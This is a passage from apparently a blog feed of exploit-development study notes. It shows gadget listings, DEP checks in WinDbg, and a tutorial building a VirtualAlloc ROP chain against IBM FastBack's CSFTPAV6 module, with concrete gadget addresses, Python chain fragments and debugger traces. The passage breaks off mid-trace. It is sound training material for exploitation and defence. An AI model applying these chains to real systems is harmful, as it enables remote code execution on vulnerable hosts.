</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x505062c0</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x5054A188</span>] ;  (<span style="color:#ae81ff">1</span> found)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x505072fa</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x5055CA10</span>] ;  (<span style="color:#ae81ff">1</span> found)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x5050733a</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x5055CA10</span>] ;  (<span style="color:#ae81ff">1</span> found)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x5050735c</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; call dword [<span style="color:#ae81ff">0x5055CA14</span>] ;  (<span style="color:#ae81ff">1</span> found)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x5050ae9f</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; inc eax ; pop esi ; pop edi ; retn <span style="color:#ae81ff">0x0004</span> ;  (<span style="color:#ae81ff">1</span> found)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x50507169</span><span style="color:#f92672">:</span> aaa  ; add byte [eax], al ; push ebx ; call dword [<span style="color:#ae81ff">0x5054A098</span>] ;  (<span style="color:#ae81ff">1</span> found)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x505212fe</span><span style="color:#f92672">:</span> aaa  ; add byte [ecx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3707D6C6</span>], al ; ret  ;  (<span style="color:#ae81ff">1</span> found)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x5051ec12</span><span style="color:#f92672">:</span> aaa  ; add dword [eax], eax ; add esp, <span style="color:#ae81ff">0x0C</span> ; pop ebp ; ret  ;  
</span></span></code></pre></div><p><strong>Note: we can choose and mix different modules in case one module doesn&rsquo;t have the gadget we want.</strong></p>
<h2 id="end-notes">End notes</h2>
<p><strong>Note 1: In Windows, the PE file can have DEP disabled but you can enable DEP for the binary by using Windows Defender Exploit Guard in Windows Defender Security Center</strong>. Here is an example, which Narly doesn&rsquo;t detect DEP in the FastBackServer module as it reads the PE header, but DEP in the module is enforced by the OS:</p>
<p><strong>Note2: In x64, opcodes differ in length, therefore the search of gadgets is dynamic and not deterministic. In other architectures with fixed opcode length (ARM &gt; 4 BYTES LENGTH), we just search for fixed offsets.</strong></p>
<p><strong>Note 3: A way to check the protections of each memory page</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> .load narly
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>nmod
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">001</span>b0000 <span style="color:#ae81ff">001e3000</span> snclientapi          <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Tivoli<span style="color:#960050;background-color:#1e0010">\</span>TSM<span style="color:#960050;background-color:#1e0010">\</span>FastBack<span style="color:#960050;background-color:#1e0010">\</span>server<span style="color:#960050;background-color:#1e0010">\</span>snclientapi.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400000</span> <span style="color:#ae81ff">00</span>c0c000 FastBackServer       <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Tivoli<span style="color:#960050;background-color:#1e0010">\</span>TSM<span style="color:#960050;background-color:#1e0010">\</span>FastBack<span style="color:#960050;background-color:#1e0010">\</span>server<span style="color:#960050;background-color:#1e0010">\</span>FastBackServer.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// We can see that the exception is enforced when EIP points to the stack and executes code. DEP is enabled for this module.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span>  ed esp <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> r eip <span style="color:#f92672">=</span> esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>vprot eip
</span></span><span style="display:flex;"><span>BaseAddress:       <span style="color:#ae81ff">010</span>ef000
</span></span><span style="display:flex;"><span>AllocationBase:    <span style="color:#ae81ff">00ff</span><span style="color:#ae81ff">0000</span>
</span></span><span style="display:flex;"><span>AllocationProtect: <span style="color:#ae81ff">00000004</span>  PAGE_READWRITE
</span></span><span style="display:flex;"><span>RegionSize:        <span style="color:#ae81ff">00001000</span>
</span></span><span style="display:flex;"><span>State:             <span style="color:#ae81ff">00001000</span>  MEM_COMMIT
</span></span><span style="display:flex;"><span>Protect:           <span style="color:#ae81ff">00000004</span>  PAGE_READWRITE
</span></span><span style="display:flex;"><span>Type:              <span style="color:#ae81ff">00020000</span>  MEM_PRIVATE
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">p</span>
</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">158</span>c<span style="color:#ae81ff">.1110</span>)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00236000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>d9b350 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>d9b350 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>d9b350 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>d9b350
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">010</span>eff44 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">010</span>eff44 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">010</span>eff70 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">010</span>eff44 <span style="color:#ae81ff">90</span>              nop
</span></span></code></pre></div>]]></description>
      
    </item>
    
    
    
    <item>
      <title></title>
      <link>http://localhost:1313/posts/osed_rop_2/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/osed_rop_2/</guid>
      <description><![CDATA[<h1 id="virtualalloc-rop">VirtualAlloc ROP</h1>
<p>Let&rsquo;s see how we can use VirtualAlloc to bypass DEP.
VirtualAlloc is a Windows API function that can reserve, commit, <strong>or change</strong> the state of a region of pages in the virtual address space of the calling process.
We are going to invoke VirtualAlloc by placing a skeleton of the function call on the stack through the buffer overflow, modifying its address and parameters through ROP, and then return into it. The skeleton should contain the VirtualAlloc address followed by the return address (which should be our shellcode) and the arguments for the function call.
Let&rsquo;s see the skeleton of VirtualAlloc:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">VirtualAlloc</span>(
</span></span><span style="display:flex;"><span>[in, optional] LPVOID lpAddress,
</span></span><span style="display:flex;"><span>[in] SIZE_T dwSize,
</span></span><span style="display:flex;"><span>[in] DWORD flAllocationType,
</span></span><span style="display:flex;"><span>[in] DWORD flProtect );
</span></span></code></pre></div><p>As shown in the function prototype, VirtualAlloc requires a parameter (dwSize) for the size of the memory region whose protection properties we are trying to change.
However, VirtualAlloc can only change the memory protections <strong>on a per-page basis</strong>, so as long as our shellcode is less than <strong>0x1000 bytes</strong> (which will probably always less than such size), we can use any value between 0x01 and 0x1000.
The two final arguments are predefined enums.
flAllocationType must be set to the MEM_COMMIT enum value (numerical value 0x00001000), while flProtect should be set to the PAGE_EXECUTE_READWRITE enum value (numerical value 0x00000040).343
This will allow the memory page to be readable, writable, and executable.</p>
<p><strong>Note</strong>: Remember that in x86 arguments are passed through the stack, so we need to push them into the stack. and not store them into the register.
<strong>Note</strong>: We will use VirtualAlloc but we could use an analogue function called VirtualProtect for the same purpose, which is changing the memory protections of the <strong>shellcode that is already located in the stack.</strong></p>
<p>So we will need to push in the stack the following things:</p>
<ul>
<li>flProtect</li>
<li>flAllocationType</li>
<li>dwSize</li>
<li>lpAddress</li>
<li>Return Address (the address of our shellcode in stack)</li>
<li>Kernel32!VirtualAlloc address</li>
</ul>
<p>Note that we first insert the latest parameters in the stack, respecting the order in which the original function will access the parameters (the first parameter is the closest to EBP).
Also, as the VirtualAlloc function will perform a &ldquo;ret&rdquo; instruction, we want to return to our shellcode so it gets executed after. That is why we add the &ldquo;Return Addres&rdquo; (like a <code>call</code> instruction would do, but as we aren&rsquo;t doing a <code>call</code> to VirtualAlloc and just a direct jump, we have to insert the return address manually). This way, once VirtualAlloc ends, the <code>ret</code> instruction will take that return address (where our shellcode starts) and execute it, once the eXecute flag has been set.</p>
<p>Now, let&rsquo;s see the issues that we will have to handle:</p>
<ol>
<li>We do not know the VirtualAlloc address beforehand. This is in the kernel32 library, which has ASLR enabled.</li>
<li>We <strong>do not know the return address</strong> (where our shellcode is) and the <strong>lpAddress</strong> (where our shellcode is) argument beforehand.</li>
<li>dwSize, flAllocationType, and flProtect contain NULL bytes.</li>
</ol>
<p>We can deal with these problems by sending placeholder values in the skeleton. Then we will assemble ROP gadgets that will dynamically fix the values we have inserted in the stack, replacing them with the correct ones.</p>
<p>Let&rsquo;s update the exploit to attach these values before the return address (therefore the exploit would be: these pushed values, the EIP overwrite, and the ROP chain to modify these values).
The following image depicts what we are doing:
<img src="content/images/post_images/rop_1%201.png" alt=""></p>
<p>We will insert the following values:</p>
<pre tabindex="0"><code>va = pack(&#34;&lt;L&#34;, (0x45454545)) # dummy VirutalAlloc Address  
va += pack(&#34;&lt;L&#34;, (0x46464646)) # Shellcode Return Address  
va += pack(&#34;&lt;L&#34;, (0x47474747)) # # dummy Shellcode Address  
va += pack(&#34;&lt;L&#34;, (0x48484848)) # dummy dwSize  
va += pack(&#34;&lt;L&#34;, (0x49494949)) # # dummy flAllocationType  
va += pack(&#34;&lt;L&#34;, (0x51515151)) # dummy flProtect
</code></pre><p>Now, when we print ESP, we can see that the values are not inserted properly in the stack, as the value of our shellcode address and flAllocationType are 00000000:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> dd esp <span style="color:#f92672">-</span> <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">014</span>ae2e8  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">45454545</span> <span style="color:#ae81ff">46464646</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">014</span>ae2f8  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">48484848</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">51515151</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">014</span>ae308  <span style="color:#ae81ff">42424242</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span></code></pre></div><p>However, this won’t impact us since we’re going to overwrite them again with ROP, but it&rsquo;s something we need to notice. Always inspect if the values you inserted in the stack are being properly reflected when the code is executed.</p>
<h1 id="patching-virtualalloc-dummy-address-using-rop">Patching VirtualAlloc dummy address using ROP</h1>
<p>First we need the stack address of the <strong>first dummy value in the stack</strong>, which is the VirtualAlloc dummy address using ROP gadgets. This value is needed so we can patch it afterwards.
The easiest way to obtain a stack address close to the dummy values is to use the ESP value at the time of the access violation (which, if we see the image, it points to the ROP chain):
<img src="content/images/post_images/rop_1%201.png" alt=""></p>
<p>We cannot modify the ESP register, since it must always point to the next gadget for ROP to function. Instead, we will copy its value to another register.
A gadget like “MOV EAX, ESP ; RET” would be ideal, but they typically do not exist as natural opcodes.
We will need to search for another gadget, like the following one:</p>
<pre tabindex="0"><code>0x50501110: push esp ; pop REG ; ret
</code></pre><p>This way we push the value of esp to the top of the stack and then we save it via <code>pop</code> to any register.
Our program does not have that type of gadget, but it does have the following gadget:</p>
<pre tabindex="0"><code>0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret
</code></pre><p>That will push the ESP value to the stack, with the value of the register EAX (we don&rsquo;t care). That way, we pop the value of EAX into EDI and the value of ESP into ESI. This way, the ESI register will contain the ESP address, as desired.</p>
<p>Let&rsquo;s search for alternative gadgets that can help us:</p>
<pre tabindex="0"><code>0x505010a7: push esp ; push eax ; pop edi ; pop esi ; retn 0x0004 ;  (1 found)
</code></pre><p>In this case, the ESP pointer gets modified by the <code>retn 0x0004</code> so it&rsquo;s not very useful&hellip;</p>
<pre tabindex="0"><code>0x505375cf: push esp ; push eax ; pop edi ; mov eax, esi ; pop esi ; ret  ;  (1 found)
</code></pre><p>This is very good because it adds an additional <code>mov eax, esi</code> but the <code>pop esi</code> instruction overried the value in <code>esi</code> with the value of <code>esp</code>.</p>
<p><strong>Note:</strong> The &ldquo;pure&rdquo; rop gadgets like <code>pop esp, ret</code> are not very common as normal programs would not normally do that. So most of the time we will need combined gadgets.</p>
<h2 id="1-obtaining-the-location-of-the-virtualalloc-parameter-in-stack">1. Obtaining the location of the VirtualAlloc parameter in stack</h2>
<p>The <code>csftpav6.dll</code> module uses <code>VirtualAlloc</code>, which is the function we want to execute. We need the address of this function. However, the address of the <code>VirtualAlloc</code> symbol <strong>is not predictable</strong>. This is because this symbol is inside <code>ntdll.dll</code>, which has ASLR enabled. When this module is mapped in the memory, the address is randomized and therefore the address of this symbol will be randomized.</p>
<p>However, remember that each of the imported functions that a module need are inside the <code>IAT</code> of the module. The entry of <code>VirtualAlloc</code> in the <code>csftpav6.dll</code> <strong>has a FIXED offset</strong>. When this function is mapped in memory, the entry of the IAT will be fulfilled dinamically with the address of <code>VirtualAlloc</code>. Therefore, our approach will be to search inside the IAT for the address of VirtualAlloc.
<img src="content/images/post_images/rop_2.png" alt="">
This is the address of VirtualAlloc inside the IAT. This means that we can use the IAT entry along with a memory dereference to fetch the address of VirtualAlloc at runtime. We’ll do this as part of our ROP chain.
With a way to resolve the address of VirtualAlloc, we must understand how to use it. In the previous step, we placed a dummy value (0x45454545) on the stack for this API address as part of our buffer overflow, which we need to overwrite.
To do this overwrite, we will need to perform <strong>three tasks with our ROP gadgets.</strong>
First, locate the address on the stack where the dummy DWORD is. Second, we need to resolve the address of VirtualAlloc. Finally, we need to write that value on top of the placeholder value.</p>
<p>We are going to need multiple gadgets for each of these tasks.
First we have to see the offset of our dummy value from the ESP. By inspecting ESP at the moment of the ROP chain, we can see that our temporal VirtualAlloc value is at offset -1C from ESP:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">006</span><span style="color:#f92672">&gt;</span> dd esp <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>C 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d39e300 <span style="color:#ae81ff">45454545</span> <span style="color:#ae81ff">46464646</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">48484848</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d39e310 <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">51515151</span> <span style="color:#ae81ff">42424242</span> <span style="color:#ae81ff">43434343</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d39e320 <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span></code></pre></div><p>The dummy value 0x45454545, which represents the location of the VirtualAlloc address, is at a negative offset of 0x1C from ESP. Ideally, since we have a copy of the ESP value in ESI, we would like to locate a gadget similar to the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>sub esi, <span style="color:#ae81ff">0x1c</span>
</span></span><span style="display:flex;"><span>ret
</span></span></code></pre></div><p>This way we would have a pointer to the location of the VirtualAlloc address in the stack.
Sadly, we couldn’t find this gadget or a similar one in CSFTPAV6.
We’ll need to be a bit more creative.
We could put the 0x1C value on the stack as part of our overflowing buffer and then pop that value into another register of our choice using a gadget. This would allow us to subtract the two registers (esi and the register that stores 0x1c) and get the desired address.</p>
<p><strong>Note:</strong> As we are going to perform arithmetic opertion with registers, we should dump the value in <code>esi</code> to <code>eax</code> or <code>ecx</code> as these registers commonly use these operations. The number of gadgets that we will find will be much higher.
The idea is to have a gadget put a copy of ESI into EAX, then pop the negative value into ECX from the stack. Next, we add ECX to EAX, and finally, copy EAX back into ESI.
One gadget that would be valid is:</p>
<pre tabindex="0"><code>0x5050118e: mov eax, esi ; pop esi ; ret  ;  (1 found)
</code></pre><p>The thing is that this gadgets perform an additional <code>pop esi</code> instruction, which means that we will need to add an additional DWORD in the stack for this instruction.
We will do it like this:</p>
<pre tabindex="0"><code>rop = pack(&#34;&lt;L&#34;, (0x5050118e)) # mov eaax, esi; pop esi; retn
rop += pack(&#34;&lt;L&#34;, (0x42424242)) # junk for the pop esi value
</code></pre><p><strong>Note:</strong> Usually, when debugging gadgets in our program, put a breakpoint at the gadget address you want to debug, or at the address of the first gadget in the chain. This way you skip the previous analysis, and go direcly to the gadget.  We let the execution go to the end of the first gadget with the pt command and finish its execution with the p command.</p>
<p>If we debug this gadget, we will find that <code>eax</code> will contain the value in <code>esi</code> (nice) and that <code>esi</code> has the dummy value (we don&rsquo;t care about <code>esi</code> anymore as our value is now in <code>eax</code>, which is better for arithmetic gadgets).
Let&rsquo;s see this gadget on debugging:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>aec298 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">85</span>ca60 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e30</span>c edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5050118</span>e esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e310</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x118e</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5050118</span>e <span style="color:#ae81ff">8</span>bc6            mov     eax,esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e30</span>c ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>aec298 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">85</span>ca60 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e30</span>c edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50501190</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e310</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1190</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50501190</span> <span style="color:#ae81ff">5</span>e              pop     esi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e30</span>c ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>aec298 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">85</span>ca60 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50501191</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e314</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1191</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50501191</span> c3              ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> dd eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0185e30</span>c  <span style="color:#ae81ff">5050118</span>e <span style="color:#ae81ff">42424242</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0185e31</span>c  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0185e32</span>c  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
</span></span></code></pre></div><p>As seen, <code>esi</code> contains our dummy value on top of the stack and then <code>eax</code> has the original <code>esi</code> value (pointer to our original ESP location, the location of the first ROP gadget).
Next, we have to pop the -0x1C value into ECX and add it to EAX. We can use a “POP ECX” instruction to get the negative value into ECX, followed by a gadget containing an “ADD EAX, ECX” instruction. This will allow us to add -0x1C to EAX
Let&rsquo;s search for this gadgets, will probably be pure as they are common operations:</p>
<pre tabindex="0"><code>0x505115a3: pop ecx ; ret  ;  (1 found)
0x5051579a: add eax, ecx ; ret  ;  (1 found)
</code></pre><p>Now we have to insert these two gadgets and the 0x1c value after the first gadget:</p>
<pre tabindex="0"><code>rop += pack(&#34;&lt;L&#34;, (0x505115a3)) # pop ecx ; ret  
rop += pack(&#34;&lt;L&#34;, (0xffffffe4)) # -0x1C  
rop += pack(&#34;&lt;L&#34;, (0x5051579a)) # add eax, ecx ; ret
</code></pre><p>Note how the -0x1c is calculated, it is done like this:</p>
<ul>
<li><strong>(28)</strong> in binary (32 bits):<br>
<code>00000000 00000000 00000000 00011100</code></li>
<li><strong>Inverting the bits</strong>:<br>
<code>11111111 11111111 11111111 11100011</code></li>
<li><strong>Add 1</strong> (complemento a dos):<br>
<code>11111111 11111111 11111111 11100100</code></li>
</ul>
<p>Now, inserting these gadget at the end shows us that the EAX points to our VirtualAlloc address in the stack, meaning that we already have a pointer to this value in EAX:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0245e30</span>c ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">06651</span>db0 ecx<span style="color:#f92672">=</span>ffffffe4 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5051579</span>a esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0245e320</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48fc</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5051579</span>a <span style="color:#ae81ff">03</span>c1            add     eax,ecx
